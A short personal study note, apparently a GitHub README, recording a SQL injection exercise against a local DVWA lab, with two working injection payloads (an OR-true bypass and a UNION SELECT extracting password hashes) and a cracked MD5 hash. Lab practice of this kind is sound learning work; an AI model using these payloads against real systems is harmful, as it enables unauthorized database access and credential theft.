# cybersecurity-notes
My penetration testing learning journey
## SQL Injection - DVWA

### Environment
- DVWA running locally via Docker
- Difficulty: Low

### Step 1 - Extracted all users
markdown**Payload:**
\```
1' OR '1'='1' #
\```
**Result:** database returned all 5 users

### Step 2 - Extracted password hashes
Payload: 1' UNION SELECT user, password FROM users #
Result: obtained MD5 hashes for all users

### Step 3 - Cracked the hash
Tool: crackstation.net
Hash: 5f4dcc3b5aa765d61d8327deb882cf99
Password: password

### Impact
Full database access with three simple queries.
Critical severity (P1).
